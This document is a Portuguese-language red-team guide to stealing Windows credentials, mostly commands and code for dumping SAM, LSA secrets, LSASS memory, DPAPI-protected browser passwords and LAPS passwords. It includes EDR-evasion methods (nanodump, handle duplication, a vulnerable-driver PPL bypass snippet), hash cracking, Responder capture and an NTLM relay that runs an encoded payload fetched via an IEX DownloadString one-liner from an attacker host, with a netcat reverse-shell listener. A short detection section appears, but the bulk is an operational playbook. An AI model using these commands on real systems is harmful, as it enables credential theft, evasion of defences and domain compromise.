---
title: "Windows Credentials"
---

# 03 - Credenciais Windows: Extração e Técnicas

## Credenciais São a Moeda do Engajamento

Credenciais são a moeda do red team. Credencial válida transforma acesso isolado em acesso lateral e, frequentemente, em comprometimento de domínio. No Windows, credenciais existem em múltiplos formatos e locais — cada um com proteção própria, técnica de extração e implicação OPSEC.

Hierarquia de impacto: Domain Admin / Enterprise Admin (comprometimento completo do domínio), contas de serviço com SPN (movimento lateral sem alerta de logon), hashes NTLM (Pass-the-Hash sem quebra de senha), tickets Kerberos (Pass-the-Ticket, Kerberoasting), senhas em texto claro (reutilização em múltiplos sistemas), credenciais locais (úteis em ambiente com reutilização de senha). MITRE ATT&CK: T1003 (OS Credential Dumping — subtécnicas .001 LSASS Memory, .002 SAM, .003 NTDS, .004 LSA Secrets, .005 Cached Domain Credentials), T1555 (Credentials from Password Stores), T1552 (Unsecured Credentials).

---

## LSASS, SAM, NTDS: Onde o Windows Guarda Tudo

### Onde o Windows Armazena Credenciais

```
┌─────────────────────────────────────────────────────────────┐
│                    LSASS Process                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐  │
│  │   Kerberos   │  │     NTLM     │  │   MSV1_0 (SAM)   │  │
│  │ Tickets + Keys│  │   Hashes     │  │   NT/LM Hashes   │  │
│  └──────────────┘  └──────────────┘  └──────────────────┘  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐  │
│  │   DPAPI      │  │  Digest Auth │  │   CredSSP        │  │
│  │ Master Keys  │  │  Cleartext*  │  │   Cleartext**    │  │
│  └──────────────┘  └──────────────┘  └──────────────────┘  │
└─────────────────────────────────────────────────────────────┘
* WDigest habilitado (Win7/2008 padrão, desabilitado no Win8.1+)
** Apenas em sessões RDP com Network Level Auth desabilitado

┌─────────────────────────────────────────────────────────────┐
│                    Registry (em disco)                       │
│  SAM: HKLM\SAM - Hashes de usuários locais                  │
│  SYSTEM: HKLM\SYSTEM - Boot key (decripta SAM)              │
│  SECURITY: HKLM\SECURITY - LSA Secrets, service passwords   │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    Arquivo NTDS.dit                          │
│  C:\Windows\NTDS\NTDS.dit (apenas em Domain Controllers)    │
│  Contém todos os hashes do domínio                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                    DPAPI Stores                              │
│  Master Keys: C:\Users\*\AppData\Roaming\Microsoft\Protect\ │
│  Credentials: C:\Users\*\AppData\Local\Microsoft\Credentials│
│  Chrome/Edge: C:\Users\*\AppData\Local\Google\Chrome\...    │
└─────────────────────────────────────────────────────────────┘
```

### O Formato de Hash NTLM

NT Hash = MD4(UTF-16LE(password))

Hashes NTLM aparecem no formato `LMHash:NTHash`:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                  LM Hash (inutilizado desde Vista)  NT Hash (é o que importa)
```

O hash NT pode ser usado diretamente para autenticação (Pass-the-Hash) sem precisar quebrar a senha.

---

## Na Prática

### Modelo OPSEC para Escolha da Técnica

Antes de qualquer extração, responda:
1. Há EDR presente? (verificado em 01_enumeracao)
2. Qual é o nível de monitoramento do LSASS?
3. Tenho privilégio SYSTEM ou apenas SeDebugPrivilege?
4. O ambiente coleta logs de Event ID 10 (Sysmon - process access)?
5. Tenho acesso físico/offline?

**Decisão:**
```
EDR avançado presente → Nanodump via BOF ou direct syscall
Defender padrão → comsvcs.dll MiniDump
Sem proteção → Mimikatz direto (mais fácil)
Acesso offline → reg save + secretsdump (sem risco)
```

---

## Exemplos de Código / Comandos

### 1. SAM Database - Extração Offline

O SAM (Security Account Manager) contém os hashes NT dos usuários locais. Ele está protegido pelo SYSKEY (boot key) armazenado na hive SYSTEM.

**Arquivos necessários:**
- `C:\Windows\System32\config\SAM` - Hashes dos usuários locais
- `C:\Windows\System32\config\SYSTEM` - Boot key para descriptografia

**Por que não se pode copiar diretamente:**
O sistema mantém lock nos arquivos enquanto o Windows está rodando. Soluções:

```cmd
REM Método 1: reg save (copia a hive enquanto o sistema está rodando)
REM Requer privilégios SYSTEM ou equivalente
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

REM Transferir para o atacante
REM (via SMB, HTTP, ou qualquer método de exfiltração)
```

```cmd
REM Método 2: Volume Shadow Copy (se existir)
REM Listar shadow copies disponíveis
vssadmin list shadows

REM Copiar SAM da shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

**Extraindo hashes com impacket-secretsdump:**

```bash
# No atacante (Kali)
# Offline (com os arquivos copiados)
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Output esperado:
# [*] Target system bootKey: 0x<bootkey>
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# john.local:1001:aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::

# Com SAM + SYSTEM + SECURITY (inclui LSA secrets)
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Online (com credenciais válidas - mais barulhento)
impacket-secretsdump DOMAIN/Administrator:password@192.168.1.10
```

---

### 2. LSASS Dump - Múltiplos Métodos

#### Método 1: Mimikatz (Alto Risco - Alta Detecção)

```
# Mimikatz interativo
privilege::debug
sekurlsa::logonpasswords        # Credenciais de todos os usuários logados
sekurlsa::wdigest               # WDigest (senha em texto claro se habilitado)
sekurlsa::kerberos              # Tickets Kerberos na memória
sekurlsa::msv                   # Hashes NTLM (MSV1_0)
sekurlsa::credman               # Credential Manager
```

**OPSEC Rating: MUITO BAIXO**
- Mimikatz é assinado em praticamente todos os AV/EDR
- Mesmo variações ofuscadas são frequentemente detectadas
- O processo de abrir LSASS com `PROCESS_VM_READ` é monitorado
- Não usar em ambientes com EDR sem evasão adequada

#### Método 2: ProcDump (Risco Médio)

```cmd
REM ProcDump é uma ferramenta legítima da Sysinternals
REM Detectável mas menos suspeito que Mimikatz

REM Encontrar PID do LSASS
tasklist | findstr lsass

REM Criar dump
procdump.exe -ma lsass.exe C:\Temp\lsass.dmp
procdump.exe -ma <PID> C:\Temp\lsass.dmp

REM Alternativa: usar -accepteula para evitar pop-up
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

Transferir o arquivo `.dmp` para o atacante e processar offline:

```
# No Mimikatz offline (sem precisar tocar no LSASS do alvo)
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**OPSEC Rating: BAIXO**
- ProcDump é assinado pela Microsoft como LOLBin
- Microsoft Defender 2019+ bloqueia procdump em LSASS
- Gera eventos de acesso ao processo no Sysmon (Event ID 10)

#### Método 3: comsvcs.dll MiniDump (Risco Médio-Baixo)

`comsvcs.dll` tem uma função exportada chamada `MiniDump` que pode ser chamada via `rundll32`:

```powershell
# Encontrar PID do LSASS
$lsassPID = (Get-Process lsass).Id

# Criar dump usando DLL nativa do Windows
rundll32 C:\Windows\System32\comsvcs.dll MiniDump $lsassPID C:\Temp\lsass.dmp full

# Em uma linha (para execução remota)
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
```

```cmd
REM Via CMD
for /f "tokens=2 delims= " %a in ('tasklist /fi "imagename eq lsass.exe" /nh') do rundll32 C:\Windows\System32\comsvcs.dll MiniDump %a C:\Temp\lsass.dmp full
```

**OPSEC Rating: MÉDIO**
- `rundll32` chamando `comsvcs.dll` é menos suspeito que Mimikatz
- Mas o acesso ao LSASS com permissões de dump ainda é monitorado
- Microsoft Defender 2022+ detecta este método
- Variação: Chamar via Task Scheduler para ofuscar parent process

#### Método 4: Task Manager (Via GUI)

```
1. Abrir Task Manager (Ctrl+Shift+Esc)
2. Ir para aba Details
3. Encontrar lsass.exe
4. Right-click → Create dump file
5. Salvo em C:\Users\%USERNAME%\AppData\Local\Temp\lsass.DMP
```

**OPSEC Rating: MÉDIO** (quando feito via RDP)
- Não gera linha de comando suspeita
- Mas é limitado a sessões interativas (GUI)
- Ainda abre handle ao LSASS que pode ser monitorado

#### Método 5: Nanodump via BOF (Melhor OPSEC)

Nanodump é um Beacon Object File (BOF) que usa técnicas avançadas para dump do LSASS:
- Fork + dump (evita abrir handle direto ao LSASS principal)
- Direct syscalls (bypassa hooks de EDR em ntdll.dll)
- Dump fragmentado em memória
- Suporte a MiniDumpWriteDump via syscall direto

```
# No Cobalt Strike Beacon
nanodump --write lsass.dmp --valid

# Com fork (mais OPSEC)
nanodump --fork --write lsass.dmp --valid

# Dump em memória (sem arquivo em disco)
nanodump --spoof-callstack --fork
```

Processar o dump (formato especial do nanodump):
```bash
# Nanodump cria um "snapshot" que precisa ser convertido
python3 restore_signature.py lsass.dmp
# Depois processar normalmente com pypykatz ou Mimikatz offline
```

**OPSEC Rating: ALTO**
- Usa syscalls diretas para evitar hooks do EDR no ntdll
- Fork do processo minimiza o tempo de acesso ao LSASS
- Sem arquivo executável em disco (BOF roda na memória do beacon)

#### Método 6: Direct Syscall LSASS Dump

Ferramentas que implementam dump sem usar as APIs monitoradas:

```csharp
// Conceito: usar NtReadVirtualMemory diretamente via syscall
// ao invés de ReadProcessMemory (que é hookada por EDRs)

// Exemplos de ferramentas que fazem isso:
// - Dumpert (BOF/exe)
// - HandleKatz (reutiliza handles existentes)
// - SilentProcessExit (via Windows Error Reporting)
```

**HandleKatz** - Reutiliza handles de LSASS já abertos por outros processos:

```
# Evita abrir novo handle ao LSASS
HandleKatz.exe --pid <lsass_pid>
```

**SilentProcessExit** - Usa Windows Error Reporting para fazer dump:

```powershell
# Configurar WER para fazer dump ao terminar processo
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "ReportingMode" -Value 1
Set-ItemProperty -Path $regPath -Name "MonitorProcess" -Value "C:\Temp\monitor.exe"

# Ao executar monitor.exe e terminar lsass (cuidado!), WER cria dump
# NOTA: Terminar lsass reinicia o sistema. Usar com extremo cuidado.
```

**OPSEC Rating: MUITO ALTO** (HandleKatz, SilentProcessExit)
- Evitam hooks convencionais
- Mais difíceis de detectar por EDRs baseados em API hooking

---

### 3. DPAPI - Data Protection API

DPAPI é o mecanismo do Windows para proteção de dados sensíveis como senhas de aplicativos. Cada usuário tem Master Keys que derivam da senha do usuário.

**Estrutura DPAPI:**
```
Senha do usuário → (PBKDF2) → Master Key
Master Key → (AES) → Protege Credential/Blob
Blob DPAPI → Dado protegido (ex: senha do Chrome)
```

**Locais das Master Keys:**
```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>\
  └── <GUID>     # Master Key file (cada usuário pode ter vários)

C:\Windows\System32\Microsoft\Protect\S-1-5-18\  # SYSTEM DPAPI keys
```

**Locais dos Credential Files:**
```
C:\Users\<username>\AppData\Local\Microsoft\Credentials\
C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\
```

**Extraindo com Mimikatz:**

```
# Quando logado como o usuário alvo (ou SYSTEM com acesso às keys)

# Listar master keys disponíveis
dpapi::cache

# Descriptografar master key usando a senha do usuário
dpapi::masterkey /in:"C:\Users\john\AppData\Roaming\Microsoft\Protect\S-1-5-21-xxx\<GUID>" /password:UserPassword123

# Ou via DOMAIN (se DC disponível para descriptografia com credenciais de backup)
dpapi::masterkey /in:"<path_to_masterkey>" /dc:DC01 /domain:corp.local

# Com master key em cache, descriptografar credential file
dpapi::cred /in:"C:\Users\john\AppData\Local\Microsoft\Credentials\<GUID>"

# Descriptografar blob genérico DPAPI
dpapi::blob /in:"<blob_file>" /masterkey:<hex_masterkey>
```

**DPAPI como SYSTEM - Descriptografar Credenciais de Todos os Usuários:**

```
# Como SYSTEM, você pode acessar as master keys do LSASS
# que contém as chaves descriptografadas na memória

sekurlsa::dpapi  # Extrai master keys do LSASS para todos os usuários logados

# Com as master keys extraídas, descriptografar tudo
dpapi::cred /in:"C:\Users\john\AppData\Local\Microsoft\Credentials\<GUID>" /masterkey:<hex>
```

#### Chrome/Edge Passwords via DPAPI

```powershell
# Encontrar banco de dados de senhas do Chrome
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"

# Copiar (Chrome tem lock no arquivo quando aberto)
Copy-Item $chromePath "$env:TEMP\LoginData"

# O arquivo é um SQLite3 database
# As senhas estão cifradas com DPAPI

# Usar ferramenta dedicada
# SharpChrome: https://github.com/djhohnstein/SharpChrome
SharpChrome.exe logins

# Ou LaZagne
LaZagne.exe browsers
```

#### Vault Credentials

Windows Credential Manager armazena credenciais em Vaults:

```powershell
# Listar credentials no Credential Manager
cmdkey /list

# Via PowerShell
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new().RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
```

Via Mimikatz:
```
vault::list
vault::cred /patch
```

---

### 4. LSA Secrets

LSA Secrets são valores armazenados em `HKLM\SECURITY\Policy\Secrets` para uso interno do sistema. Tipicamente contém:

- **$MACHINE.ACC**: Senha da conta de máquina do AD (para domain join)
- **DefaultPassword**: Senha de autologon configurada
- **_SC_<ServiceName>**: Senhas de contas de serviço configuradas manualmente
- **DPAPI_SYSTEM**: Master key do DPAPI do sistema

**Extraindo LSA Secrets:**

```cmd
REM Salvar as hives necessárias (requer SYSTEM)
reg save HKLM\SECURITY C:\Temp\SECURITY
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

```bash
# Offline com impacket
impacket-secretsdump -system SYSTEM -security SECURITY LOCAL

# Output exemplo:
# [*] Dumping LSA Secrets
# [*] $MACHINE.ACC
# CORP\WORKSTATION01$:plain_password_hex:...
# [*] DefaultPassword
# (Unknown User): UserPassword
# [*] _SC_SQLServerAgent
# CORP\svc_sql: SqlServicePass123!
# [*] DPAPI_SYSTEM
# dpapi_machinekey: 0xd6b...
# dpapi_userkey: 0xa3c...
```

**Online (requer credenciais de admin):**

```bash
impacket-secretsdump CORP/Administrator:Password@192.168.1.10
```

Via Mimikatz:
```
privilege::debug
token::elevate
lsadump::secrets
```

**OPSEC**: `reg save HKLM\SECURITY` requer acesso SYSTEM e é monitorado. Prefira dump online via impacket se já tiver credenciais admin.

---

### 5. LAPS (Local Administrator Password Solution)

LAPS gerencia senhas únicas para a conta Administrator local em cada máquina do domínio. A senha é armazenada no atributo AD `ms-Mcs-AdmPwd`.

**Quem pode ler:**
- Apenas usuários/grupos com `Read ms-Mcs-AdmPwd` explicitamente concedido
- Domain Admins (sempre)
- Contas de leitura de LAPS configuradas pelo admin

**Encontrando e lendo senhas LAPS:**

```powershell
# Verificar se LAPS está instalado
Get-Command Get-AdmPwdPassword -ErrorAction SilentlyContinue
Get-Module AdmPwd.PS -ListAvailable

# Ler senha LAPS (se tiver permissão)
Get-AdmPwdPassword -ComputerName WORKSTATION01
Get-AdmPwdPassword -ComputerName WORKSTATION01 | Select-Object Password, ExpirationTimestamp

# Via PowerView/AD Module
Get-DomainObject -Identity WORKSTATION01 -Properties ms-Mcs-AdmPwd
Get-ADComputer -Identity WORKSTATION01 -Properties "ms-Mcs-AdmPwd" | Select-Object ms-Mcs-AdmPwd

# Busca em massa - quem tem senha LAPS configurada
Get-DomainComputer -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null}
```

**LAPS Toolkit - Enumeração Avançada:**

```powershell
# Importar LAPSToolkit
Import-Module LAPSToolkit.ps1

# Encontrar grupos com permissão de leitura
Find-LAPSDelegatedGroups

# Encontrar usuários com Extended Rights (podem ler LAPS)
Find-AdmPwdExtendedRights

# Ler todas as senhas LAPS acessíveis
Get-LAPSComputers
```

**Detectando LAPS sem permissão de leitura:**

```powershell
# Se o atributo existe mas está vazio para você, LAPS está ativo mas você não tem permissão
Get-DomainComputer -Properties ms-Mcs-AdmPwdExpirationTime | 
    Where-Object {$_.'ms-Mcs-AdmPwdExpirationTime' -ne $null}
```

---

### 6. Encontrando Credenciais no Sistema de Arquivos e Configurações

Além das stores padrão, credenciais frequentemente aparecem em:

```powershell
# Arquivos de configuração com senhas
$searchPaths = @(
    "C:\",
    "C:\Users\",
    "C:\inetpub\",
    "C:\Program Files\",
    "C:\Temp\"
)

$patterns = @("password", "passwd", "pwd", "secret", "credential", "api_key", "token")

foreach ($path in $searchPaths) {
    foreach ($pattern in $patterns) {
        Get-ChildItem -Path $path -Recurse -Include *.txt,*.xml,*.config,*.ini,*.yaml,*.yml,*.json -ErrorAction SilentlyContinue |
            Select-String -Pattern $pattern -ErrorAction SilentlyContinue |
            Select-Object Filename, LineNumber, Line |
            Format-Table -AutoSize
    }
}
```

```powershell
# Credenciais em arquivos de configuração IIS
Get-Content "C:\Windows\Microsoft.NET\Framework*\v*\Config\machine.config" | 
    Select-String -Pattern "password|connectionstring"

Get-Content "C:\inetpub\wwwroot\web.config" | 
    Select-String -Pattern "password|connectionstring"

# Autologon credentials no registry
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | 
    Select-Object DefaultUserName, DefaultPassword, DefaultDomain

# Unattended install files (frequentemente contém senhas de admin)
$unattendedPaths = @(
    "C:\Unattend.xml",
    "C:\Windows\Panther\Unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\System32\Sysprep\Sysprep.xml"
)

foreach ($file in $unattendedPaths) {
    if (Test-Path $file) {
        Write-Output "ENCONTRADO: $file"
        Get-Content $file | Select-String -Pattern "Password|AdministratorPassword|LocalAccountPassword"
    }
}

# Credenciais em PowerShell history
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" | 
    Select-String -Pattern "password|credential|passwd|secret|-Password"

# Credenciais no histórico de RDP (servidores conectados recentemente)
Get-ItemProperty "HKCU:\Software\Microsoft\Terminal Server Client\Servers\*" | 
    Select-Object PSChildName, UsernameHint
```

---

### 7. Ansible Vault (quando encontrado em Windows targets)

Em ambientes mistos ou quando o alvo é um servidor de automação:

```bash
# Encontrar arquivos Vault
find /home /opt /etc -name "*.vault" -o -name "vault_pass*" 2>/dev/null
grep -r "ANSIBLE_VAULT" /etc /home /opt 2>/dev/null

# Converter para formato hashcat
ansible2john vault_file.yml > vault.hash

# Quebrar com hashcat
hashcat -m 16900 vault.hash /usr/share/wordlists/rockyou.txt

# Ou com john
john --wordlist=/usr/share/wordlists/rockyou.txt vault.hash
```

---

### 8. Hashcat — Modos para Hashes Windows

Identificação rápida de modo:

```bash
hashid -m HASH          # sugere modo hashcat
hash-identifier HASH    # alternativa
```

| Hash | Modo | Como Obter |
|------|------|-----------|
| NTLM (NT hash) | 1000 | Mimikatz SAM/LSASS dump |
| Net-NTLMv2 | 5600 | Responder (captura de rede) |
| Net-NTLMv1 | 5500 | Responder (ambientes legados) |
| KeePass 2.x | 13400 | Arquivo `.kdbx` encontrado no host |
| SSH key RSA | 22921 | Chave privada com passphrase |
| SHA512crypt Linux | 1800 | `/etc/shadow` |
| bcrypt | 3200 | Hashes de aplicações web |
| Ansible Vault | 16900 | `ansible2john` |

**Cracking NTLM:**

```bash
# NTLM extraído como só o hash NT (sem LM prefix)
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Net-NTLMv2 (capturado pelo Responder)
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 5600 netntlmv2.hash rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force
```

**Regras de mutação — cobertura corporativa:**

```bash
# Regras disponíveis em Kali
ls /usr/share/hashcat/rules/
# best64.rule         → 64 regras, rápido, boa cobertura básica
# d3ad0ne.rule        → mais abrangente
# rockyou-30000.rule  → alto custo, usar com KeePass/bcrypt
# OneRuleToRuleThemAll.rule → máximo de cobertura

# Regra customizada para padrão corporativo (Password2024!)
# /tmp/corp.rule:
#   c$2024
#   c$2024!
#   c$2023
#   c$1
#   $1$2$3

hashcat -m 1000 ntlm.txt rockyou.txt -r /tmp/corp.rule --force
```

**Preview de regras sem cracking:**

```bash
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -20
```

---

### 9. KeePass — Extração e Cracking

```powershell
# Encontrar arquivo .kdbx no host
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```bash
# Linux
find / -name "*.kdbx" 2>/dev/null
```

```bash
# Extrair hash do arquivo .kdbx
keepass2john Database.kdbx > keepass.hash

# keepass2john adiciona prefixo "Database:" — remover antes de crackear
sed -i 's/^[^:]*://' keepass.hash

# Crackear (modo 13400)
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 13400 keepass.hash rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

---

### 10. SSH Key — Cracking de Passphrase

```bash
# Ajustar permissão da chave encontrada
chmod 600 id_rsa

# Extrair hash
ssh2john id_rsa > ssh.hash

# Hashcat (modo 22921 — pode falhar com cifras modernas como aes-256-ctr)
hashcat -m 22921 ssh.hash rockyou.txt --force

# John the Ripper — mais compatível com chaves modernas (Ed25519, ECDSA)
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

# Usar chave após crackear
ssh -i id_rsa user@TARGET_IP
```

---

### 11. Net-NTLMv2 — Captura com Responder

Net-NTLMv2 é o desafio-resposta NTLM capturado via rede — **não pode ser usado em Pass-the-Hash** mas pode ser crackeado offline ou usado em relay.

**Captura:**

```bash
# Identificar interface correta
ip a

# Iniciar Responder (captura SMB, HTTP, LDAP, etc.)
sudo responder -I eth0
sudo responder -I tap0        # em labs via VPN

# Forçar autenticação a partir de shell no alvo Windows
dir \\KALI_IP\test
net use \\KALI_IP\test

# Hash capturado salvo em:
/usr/share/responder/logs/
# Formato: user::DOMAIN:CHALLENGE:HASH:...
```

**Cracking do hash capturado:**

```bash
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 5600 netntlmv2.hash rockyou.txt -r best64.rule --force
```

**NTLM Relay com ntlmrelayx** — autenticar sem crackear:

```bash
# 1. Desabilitar SMB e HTTP no Responder (só capturar, não responder)
# /usr/share/responder/Responder.conf:
# SMB = Off
# HTTP = Off

# 2. Iniciar ntlmrelayx apontando para host alvo
impacket-ntlmrelayx --no-http-server -smb2support \
  -t 192.168.1.20 \
  -c "powershell -enc BASE64_PAYLOAD"

# 3. Iniciar Responder
sudo responder -I eth0

# 4. Listener para reverse shell
nc -nvlp 4444
```

Fluxo: Alvo A autentica NTLM → Responder captura → ntlmrelayx faz relay para Alvo B → Alvo B executa comando.

**Pré-requisito de relay:** `LocalAccountTokenFilterPolicy=1` no host alvo (UAC Remote Restrictions desabilitado) OU alvo é DC sem SMB signing.

```bash
# Gerar payload PowerShell encodado
CMD='IEX(New-Object Net.WebClient).DownloadString("http://KALI/shell.ps1")'
echo -n "$CMD" | iconv -t utf-16le | base64 -w 0
```

---

## Detecção e OPSEC

### Rating Consolidado de OPSEC

| Técnica | OPSEC | Detecção Moderna | Efetividade |
|---------|-------|-----------------|-------------|
| Mimikatz direto | Muito Baixo | Quase certa | Alta |
| ProcDump lsass | Baixo | Provável | Alta |
| comsvcs.dll dump | Médio | Possível | Alta |
| Task Manager | Médio | Moderada | Alta |
| Nanodump BOF | Alto | Improvável | Alta |
| Direct Syscall | Muito Alto | Rara | Alta |
| reg save SAM | Médio | Possível | Média (só local) |
| impacket secretsdump | Médio | Gera artefatos de rede | Alta |
| DPAPI offline | Alto | Rara | Média-Alta |
| SharpChrome | Médio | Dependente do AV | Média |

### Indicadores Comuns de Detecção

**Eventos Windows:**
- **Event ID 4656**: Handle para objeto LSASS solicitado (com Sysmon)
- **Sysmon Event 10**: Process Access - LSASS sendo acessado
- **Event ID 4663**: Acesso a objeto (com auditoria habilitada)
- **Event ID 4624**: Logon Type 3 em múltiplos hosts (pass-the-hash)

**Assinaturas de Comportamento:**
- `lsass.exe` sendo acessado por processos que não são serviços de sistema
- `rundll32.exe` com argumento `comsvcs.dll`
- `reg.exe` salvando hives SYSTEM/SAM/SECURITY
- Leitura de `C:\Windows\System32\config\SAM`

### Técnicas de Evasão

```powershell
# 1. Usar PPL Bypass antes de dump (Protected Process Light)
# lsass pode ser configurado como PPL - verificar:
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL"
# Se 1, precisa de driver signed ou kernel exploit

# 2. Processar dump offline (reduz tempo de acesso ao LSASS)
# Criar dump → transferir → analisar no atacante

# 3. Para Pass-the-Hash: usar ferramentas que não criam novos processos filho
# Impacket é melhor que Mimikatz sekurlsa::pth em OPSEC

# 4. Ofuscar nomes de ferramentas e argumentos
# Renomear procdump.exe para calc.exe não ajuda muito
# EDRs verificam hash e comportamento, não apenas nome
```

---

## LSASS Dump — Técnicas Avançadas

LSASS clássico (`procdump -ma`, `comsvcs MiniDump`) é trivialmente detectado por EDR. Variantes mais stealth:

### 1. Handle Duplication (HandleKatz)

EDR monitora `OpenProcess(LSASS)` diretamente. HandleKatz abusa do fato que **outros processos** já têm handle aberto para LSASS:

1. Enumerar handles em todos processos via `NtQuerySystemInformation(SystemHandleInformation)`.
2. Identificar handle cujo `UniqueProcessId` aponta para LSASS PID.
3. `DuplicateHandle(hSourceProcess, hLsassHandle, GetCurrentProcess(), &hDuped, PROCESS_VM_READ, FALSE, 0)`.
4. `MiniDumpWriteDump` com handle duplicado.

```c
typedef struct {
    USHORT Object;
    USHORT UniqueProcessId;
    HANDLE HandleValue;
    ULONG GrantedAccess;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

// Pseudo-code
for each handle in NtQuerySystemInformation(SystemHandleInformation) {
    if (handle.PID == lsassPid && handle.GrantedAccess == PROCESS_ALL_ACCESS) {
        HANDLE hSource = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handle.PID);
        DuplicateHandle(hSource, handle.Handle,
                        GetCurrentProcess(), &hDuped,
                        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, 0);
        MiniDumpWriteDump(hDuped, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    }
}
```

EDR não vê `OpenProcess(LSASS)` direto — vê `DuplicateHandle` de outro processo.

### 2. PPL Bypass — Protected Process Light

Windows 8.1+: LSASS pode rodar como PPL (`Protected Process Light`). Processos non-PPL não podem abrir handle com `PROCESS_VM_READ`.

Bypass via **BYOVD** (driver vulnerável com menos verificações):
- Carregar driver assinado vulnerável (ex: `RTCore64.sys`).
- Invocar IOCTL para ler memória de processo PPL diretamente.

```c
// RTCore64 IOCTL para memória read
DWORD BytesReturned;
struct { DWORD PID; PVOID Addr; SIZE_T Sz; PVOID BufOut; } req;
req.PID = lsassPid;
req.Addr = pLsassBase;
req.Sz = sizeof(LSASS_DATA_SECTION);
DeviceIoControl(hDriver, IOCTL_READ_MEMORY, &req, sizeof(req),
                &req, sizeof(req), &BytesReturned, NULL);
```

Ferramentas prontas: **EDRSandBlast**, **PPLdump** (itm4n).

### 3. RtlReportSilentProcessExit (Silent Exit Hijack)

Windows `werfault.exe` tem mecanismo de dump automático quando processo sai silenciosamente. Configurável em HKCU registry sem admin:

```
HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe
    MonitorProcess    = "C:\Windows\System32\cmd.exe /c ..."
    ReportingMode     = 1
    LocalDumpFolder   = "C:\Temp\"
    DumpType          = 2  (MiniDump full)
```

1. Setar registry key.
2. Disparar `RtlReportSilentProcessExit(hLsass)` — kernel gera dump via `werfault.exe` (trusted process).
3. Dump aparece em `LocalDumpFolder` assinado por Windows Error Reporting (não por nosso processo).

**Sem acesso a LSASS handle direto**. WER faz o dump como trusted system process.

### 4. SECLOGON Race Condition

`seclogon.dll` (Secondary Logon service, LSASS host) ocasionalmente abre handle ao LSASS para sync de token. Monitore com loop:

```c
// Snapshot threads do seclogon.exe / svchost.exe
// Em cada snapshot, procurar handle LSASS com acesso alto
while (TRUE) {
    HANDLE hDuped = TryStealLsassHandle(); // handle dup se encontrado
    if (hDuped) {
        MiniDumpWriteDump(hDuped, ...);
        break;
    }
    Sleep(10);
}
```

Race com SECLOGON = janela de ms. Prático só em ambientes específicos.

### 5. LSASS Dup via `/proc`-style (NtQuerySystemInformation)

Abordagem mais genérica: varrer todos handles do sistema, filtrar por `ObjectTypeIndex` = `Process` e `GrantedAccess` adequado. Sem referenciar diretamente o LSASS PID no `OpenProcess` — só DuplicateHandle.

---

## SAM Dump — Variantes

### SAM Local (Registry em Runtime)

```cmd
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
